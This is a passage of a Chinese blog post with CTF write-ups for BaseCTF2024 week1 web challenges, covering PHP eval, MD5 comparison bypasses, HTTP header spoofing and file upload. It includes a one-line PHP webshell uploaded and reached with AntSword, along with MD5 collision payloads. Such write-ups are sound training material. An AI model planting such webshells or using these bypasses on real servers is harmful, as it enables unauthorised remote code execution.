<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"><title>BaseCTF2024-web | Dre4m1nd</title><meta name="author" content="Dre4m1nd"><meta name="copyright" content="Dre4m1nd"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="week1喵喵喵´•ﻌ•&#96;考点：eval（）函数： eval() 函数把字符串按照 PHP 代码来计算。 该字符串必须是合法的 PHP 代码，且必须以分号结尾。 system()函数 php 代码不能直接执行 shell 命令，还需要借助 system （）函数 题解：进入题目，源码如下 12345678910111213&lt;?php&#x2F;&#x2F; 高亮显示当前文件内容，方便调试和查看代码结构h"><meta property="og:type" content="article"><meta property="og:title" content="BaseCTF2024-web"><meta property="og:url" content="http://dre4m1nd.github.io/2024/11/17/BaseCTF2024-web/index.html"><meta property="og:site_name" content="Dre4m1nd"><meta property="og:description" content="week1喵喵喵´•ﻌ•&#96;考点：eval（）函数： eval() 函数把字符串按照 PHP 代码来计算。 该字符串必须是合法的 PHP 代码，且必须以分号结尾。 system()函数 php 代码不能直接执行 shell 命令，还需要借助 system （）函数 题解：进入题目，源码如下 12345678910111213&lt;?php&#x2F;&#x2F; 高亮显示当前文件内容，方便调试和查看代码结构h"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://dre4m1nd.github.io/img/Dre4m1nd.jpg"><meta property="article:published_time" content="2024-11-17T08:07:51.000Z"><meta property="article:modified_time" content="2024-11-17T08:41:26.789Z"><meta property="article:author" content="Dre4m1nd"><meta property="article:tag" content="BaseCTF2024"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http://dre4m1nd.github.io/img/Dre4m1nd.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://dre4m1nd.github.io/2024/11/17/BaseCTF2024-web/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//hm.baidu.com"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>(() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()</script><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d4f70d8e726baa25349d5b4c01691cc1";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
btf.addGlobalFn('pjaxComplete', () => {
  _hmt.push(['_trackPageview',window.location.pathname])
}, 'baidu_analytics')</script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"BaseCTF2024-web",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,isShuoshuo:!1}</script><link rel="stylesheet" href="/css/imgloaded.css?1"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/Dre4m1nd.jpg" onerror='onerror=null,src="/img/friend_404.gif"' alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url(/img/余霞.png)"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Dre4m1nd</span></a><a class="nav-page-title" href="/"><span class="site-name">BaseCTF2024-web</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">BaseCTF2024-web</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-11-17T08:07:51.000Z" title="发表于 2024-11-17 16:07:51">2024-11-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-17T08:41:26.789Z" title="更新于 2024-11-17 16:41:26">2024-11-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h2 id="喵喵喵´•ﻌ•"><a href="#喵喵喵´•ﻌ•" class="headerlink" title="喵喵喵´•ﻌ•&#96;"></a>喵喵喵´•ﻌ•&#96;</h2><h3 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h3><p><strong>eval（）函数</strong>：</p><p>eval() 函数把字符串按照 PHP 代码来计算。</p><p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p><p><strong>system()函数</strong></p><p>php 代码不能直接执行 shell 命令，还需要借助 system （）函数</p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>进入题目，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 高亮显示当前文件内容，方便调试和查看代码结构</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// 关闭错误报告</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 GET 请求中的参数 &#x27;DT&#x27; 的值，并赋值给变量 $a</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;DT&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 eval 函数执行 $a 中的代码，这是非常危险的操作，因为可以执行任意用户输入的代码，可能导致安全漏洞</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1730723685897-6fdb7bbc-69dd-455c-a88f-ca31df1f5762.png" referrerpolicy="no-referrer"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1730723739027-8385c6b1-99db-43ed-a50f-d793705a656f.png" referrerpolicy="no-referrer"></p><h2 id="md5绕过欸"><a href="#md5绕过欸" class="headerlink" title="md5绕过欸"></a>md5绕过欸</h2><h3 id="考点：-1"><a href="#考点：-1" class="headerlink" title="考点："></a>考点：</h3><p><strong>弱类型比较（&#x3D;&#x3D;）：</strong> 弱类型比较，两个不同类型比较时，会自动转换成相同类型后再比较值</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731668422252-5a890dc4-5e90-4b1c-bbf9-c7bf0ac748aa.png" referrerpolicy="no-referrer"></p><blockquote><p>if(“admin”&#x3D;&#x3D;0) &#x2F;&#x2F;true</p><p>if(“1admin”&#x3D;&#x3D;1)&#x2F;&#x2F;true</p><p>if(“admin1”&#x3D;&#x3D;1)&#x2F;&#x2F;false</p><p>if(“0e12324”&#x3D;&#x3D;”0e1324”)&#x2F;&#x2F;true</p></blockquote><p>**强类型比较： **需要比较值和类型</p><p><strong>MD5 加密原理：</strong></p><ol><li>MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组<strong>级联</strong>后将生成一个128位散列值。</li><li>在MD5算法中，首先需要对信息进行填充，填充方法如下：先在信息后面填充一个1，之后就是无数个0，直到使其字节长度对512求余数的结果等于448，即（n*512) + 448 ,为什么要是余数为448呢，因为剩下的512-448 等于64位 是用于表示填充前的信息长度。加上剩下的64位，即（n+1)*512,长度刚刚好是512的整数倍数。</li><li>然后就与链接变量进行循环运算，得出结果。MD5中有四个32位被称作链接变量（Chaining Variable）的整数参数，他们分别为：A&#x3D;0x01234567，B&#x3D;0x89abcdef，C&#x3D;0xfedcba98，D&#x3D;0x76543210。当设置好这四个链接变量后，就开始进入算法的四轮循环运算。具体内部怎么运算，是关于数学方面的，有兴趣的同学可以自行去了解下，这里不进行更加多的解释。</li></ol><p><strong>MD5 绕过：</strong></p><ul><li><strong>未规定输入类型:</strong></li></ul><p>因为 md5() 函数不能处理数组,所以在未明确规定输入类型时,可以输入数组类型,从而实现对强比较和弱比较 的绕过</p><ul><li><strong>规定输入类型</strong><ul><li><strong>弱比较</strong></li></ul></li></ul><p>提供部分数据及 md5 加密后的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br></pre></td></tr></table></figure><pre><code>- **强比较**
</code></pre><p>这里展示一组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p1=ten%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%EF%E4%B5h%A7y%<span class="number">95</span>C%<span class="number">60</span>%<span class="number">8</span>A%E0a%<span class="number">0</span>B%B8%<span class="number">3</span>D%D8%<span class="number">26</span>%F5%A3%<span class="number">13</span>%<span class="number">8</span>F%<span class="number">3</span>F%<span class="number">7</span>D%D4%<span class="number">5</span>Cb%<span class="number">81</span>%<span class="number">25</span>v%<span class="number">98</span>%<span class="number">8</span>CHA%<span class="number">05</span>%<span class="number">0</span>D%ED%C2%<span class="number">8</span>B%E7j%EFou%<span class="number">22</span>%<span class="number">01</span>%<span class="number">10</span>c_%AD%F9%<span class="number">5</span>E%<span class="number">84</span>%A5%C1%<span class="number">95</span>%F9K%<span class="number">3E7</span>%<span class="number">7</span>Bdd%C2dT%<span class="number">98</span>V%B1%F2%DD%B6%<span class="number">2</span>C%F2%<span class="number">7</span>B%E8%<span class="number">19</span>%<span class="number">12</span>%<span class="number">9</span>A%<span class="number">29</span>%<span class="number">9</span>D%<span class="number">5</span>D%<span class="number">13</span>Lm%FEN%<span class="number">85</span>%CE%<span class="number">7</span>E%CD%AF%<span class="number">5</span>B%<span class="number">5</span>B%<span class="number">10</span>eA%E9%B0%C4%AA%<span class="number">94</span>%EA%A2%DE%E9%A0%EBP%<span class="number">98</span>%<span class="number">8</span>A%<span class="number">0</span>A_%<span class="number">1</span>D%<span class="number">13</span>%<span class="number">8</span>E%<span class="number">83</span>%DA%C6%<span class="number">97</span>%<span class="number">21</span>%<span class="number">05</span>%<span class="number">82</span>%E7%EA%<span class="number">03</span>_%<span class="number">27</span>%C4</span><br><span class="line">p2=ten%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%EF%E4%B5h%A7y%<span class="number">95</span>C%<span class="number">60</span>%<span class="number">8</span>A%E0a%<span class="number">0</span>B%B8%<span class="number">3</span>D%D8%<span class="number">26</span>%F5%A3%<span class="number">93</span>%<span class="number">8</span>F%<span class="number">3</span>F%<span class="number">7</span>D%D4%<span class="number">5</span>Cb%<span class="number">81</span>%<span class="number">25</span>v%<span class="number">98</span>%<span class="number">8</span>CHA%<span class="number">05</span>%<span class="number">0</span>D%ED%C2%<span class="number">8</span>B%E7j%EFou%<span class="number">22</span>%<span class="number">01</span>%<span class="number">90</span>c_%AD%F9%<span class="number">5</span>E%<span class="number">84</span>%A5%C1%<span class="number">95</span>%F9K%<span class="number">3E7</span>%FBdd%C2dT%<span class="number">98</span>V%B1%F2%DD%B6%<span class="number">2</span>C%F2%<span class="number">7</span>B%E8%<span class="number">19</span>%<span class="number">12</span>%<span class="number">9</span>A%<span class="number">29</span>%<span class="number">9</span>D%<span class="number">5</span>D%<span class="number">13</span>L%ED%FEN%<span class="number">85</span>%CE%<span class="number">7</span>E%CD%AF%<span class="number">5</span>B%<span class="number">5</span>B%<span class="number">10</span>eA%E9%B0%C4%AA%<span class="number">94</span>%EA%A2%DE%E9%A0%EBP%<span class="number">98</span>%<span class="number">0</span>A%<span class="number">0</span>A_%<span class="number">1</span>D%<span class="number">13</span>%<span class="number">8</span>E%<span class="number">83</span>%DA%C6%<span class="number">97</span>%<span class="number">21</span>%<span class="number">05</span>%<span class="number">82</span>%E7j%<span class="number">03</span>_%<span class="number">27</span>%C4  </span><br></pre></td></tr></table></figure><h3 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h3><p>进入题目，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 高亮显示当前文件内容，方便调试和查看代码结构</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// 关闭错误报告</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 引入包含 flag 的文件</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否同时设置了 GET 参数 &#x27;name&#x27;、&#x27;name2&#x27; 和 POST 参数 &#x27;password&#x27;、&#x27;password2&#x27;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">// 获取 GET 参数 &#x27;name&#x27; 的值并赋值给 $name</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="comment">// 获取 GET 参数 &#x27;name2&#x27; 的值并赋值给 $name2</span></span><br><span class="line">    <span class="variable">$name2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name2&#x27;</span>];</span><br><span class="line">    <span class="comment">// 获取 POST 参数 &#x27;password&#x27; 的值并赋值给 $password</span></span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="comment">// 获取 POST 参数 &#x27;password2&#x27; 的值并赋值给 $password2</span></span><br><span class="line">    <span class="variable">$password2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>];</span><br><span class="line">    <span class="comment">// 如果 $name 不等于 $password 且 $name 和 $password 的 MD5 值相等</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$name</span>!= <span class="variable">$password</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">        <span class="comment">// 如果 $name2 不等于 $password2 且 $name2 和 $password2 的 MD5 值也相等</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$name2</span>!== <span class="variable">$password2</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$name2</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$password2</span>)) &#123;</span><br><span class="line">            <span class="comment">// 输出 flag</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 输出提示信息，表示第二个条件不满足</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;再看看啊，马上绕过嘞！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 输出提示信息，表示第一个条件不满足</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;错啦错啦&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果没有设置必要的参数，输出提示信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;没看到参数呐&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为这题没有禁用数组，所以传入四个参数均为数组就可以</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1730724524495-ed0dc89d-3a15-45bb-bd1a-9624af9cf3ee.png" referrerpolicy="no-referrer"></p><h2 id="HTTP-是什么呀"><a href="#HTTP-是什么呀" class="headerlink" title="HTTP 是什么呀"></a>HTTP 是什么呀</h2><h3 id="考点：-2"><a href="#考点：-2" class="headerlink" title="考点："></a>考点：</h3><p><strong>http 请求头：</strong></p><p>请求头内容请看<a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxz-sw/p/6761984.html">参考文章</a></p><p><strong>补充:</strong></p><p>**X-Forwarded-For: **简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP</p><h3 id="题解：-2"><a href="#题解：-2" class="headerlink" title="题解："></a>题解：</h3><p>要求如下</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1730724969465-da54ea22-4ef1-405a-913b-c2314a72048a.png" referrerpolicy="no-referrer"></p><p>burp 抓包修改请求头</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1730725408762-d491aab4-421c-4701-bdb7-ddfec3d2cce5.png" referrerpolicy="no-referrer"></p><p>之后进行 base64 解码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1730725948293-e70ceade-15da-4f49-96d7-8ef452403312.png" referrerpolicy="no-referrer"></p><h2 id="A-Dark-Room"><a href="#A-Dark-Room" class="headerlink" title="A Dark Room"></a>A Dark Room</h2><h3 id="考点：-3"><a href="#考点：-3" class="headerlink" title="考点："></a>考点：</h3><p>不太明白这个题，做了可点击的界面，却把 flag 直接放在源码中</p><h3 id="题解：-3"><a href="#题解：-3" class="headerlink" title="题解："></a>题解：</h3><p>flag 在源码中,按下 F12 即可</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1730726433049-c769a6c1-11cd-4b18-8b51-4aad27445674.png" referrerpolicy="no-referrer"></p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><h3 id="考点：-4"><a href="#考点：-4" class="headerlink" title="考点："></a>考点：</h3><p>**文件上传漏洞(**上传一个 php 文件或者将一句话木马传入可以解析 php 的地方)</p><p>编写一个 php 文件</p><p>内容是一句话木马,蚁剑连接时密码就是 shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="题解：-4"><a href="#题解：-4" class="headerlink" title="题解："></a>题解：</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1730726681807-e92172bd-8a1e-428c-bd86-4cb4e889bf2c.png" referrerpolicy="no-referrer"></p><p>虽然网页标签名叫“上传喜欢的照片”，但是随便上传一个文件，发现上传成功而且爆出了源码，看见没有任何过滤，直接写个一句话木马上传</p><p>上传之后，根据源码知道木马文件地址在同级目录 upload 下而且没有被重命名</p><p>之后蚁剑连接，拿到 flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1730727219087-ea63dcd8-4481-47f9-9c68-7cc81c61e8fe.png" referrerpolicy="no-referrer"></p><h2 id="Aura-酱的礼物"><a href="#Aura-酱的礼物" class="headerlink" title="Aura 酱的礼物"></a>Aura 酱的礼物</h2><h3 id="考点：-5"><a href="#考点：-5" class="headerlink" title="考点："></a>考点：</h3><p><strong>php 伪协议:</strong><a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/120695429?ops_request_misc=%257B%2522request%255Fid%2522%253A%252202F23DC3-ED75-41BD-892E-C1B43F54E542%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=02F23DC3-ED75-41BD-892E-C1B43F54E542&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~top_positive~default-1-120695429-null-null.nonecase&utm_term=php%E4%BC%AA%E5%8D%8F%E8%AE%AE&spm=1018.2226.3001.4450"><strong>参考文章</strong></a></p><p><strong>题目中的 file_get_contents()可以使用 data:&#x2F;&#x2F; 伪协议绕过</strong></p><p><strong>最后文件包含,可以使用 filter:&#x2F;&#x2F; 伪协议读取</strong></p><p><strong>ssrf</strong></p><p>参考文章：<a target="_blank" rel="noopener" href="https://tttang.com/archive/1648/">https://tttang.com/archive/1648/</a></p><p>绕过</p><ul><li>@符，对于一个 url 的访问实际上是以 @符后为准的，比如说<a target="_blank" rel="noopener" 